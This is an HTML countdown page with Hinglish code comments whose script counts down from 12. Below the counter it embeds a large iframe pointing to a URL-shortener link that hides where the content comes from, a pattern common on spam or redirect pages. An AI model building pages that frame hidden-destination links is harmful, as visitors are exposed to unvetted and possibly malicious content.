<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Countdown Website</title>
    <style>
    	/* Mobile responsive ke liye viewport ko adjust karte hain */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
}

/* Countdown ke liye style */
.container {
    text-align: center;
}

h1 {
    font-size: 2rem;
    margin-bottom: 20px;
}

#countdown {
    font-size: 4rem;
    color: #ff5722;
}

/* Mobile-friendly responsiveness */
@media (max-width: 600px) {
    h1 {
        font-size: 1.5rem;
    }
    #countdown {
        font-size: 3rem;
    }
}
    </style>
</head>
<body>
    <div class="container">
        <h1>Countdown</h1>
        <div id="countdown">12</div>
    </div>
    
    <div style="padding: 10px;">
        <div style="position: relative; width: 100%; padding-bottom: 56.25%; height: 800px; overflow: hidden; border-radius: 0;">
            <iframe 
                src="https://shorten.is/RsvVF" 
                style="position: absolute; top: 0; left: 0; width: 100%; height: 800px; border: 0; border-radius: 0;" 
                scrolling="no" 
                frameborder="0" 
                allowfullscreen="true">
            </iframe>
        </div>
    </div>


    <script>
    	// Countdown ko handle karne ke liye JS
let countdownElement = document.getElementById('countdown');
let countdownValue = 12;

const countdownInterval = setInterval(() => {
    countdownValue--;
    countdownElement.textContent = countdownValue;

    if (countdownValue === 0) {
        clearInterval(countdownInterval);
        countdownElement.textContent = "Time's up!";
    }
}, 1000);

    </script>
</body>
</html>
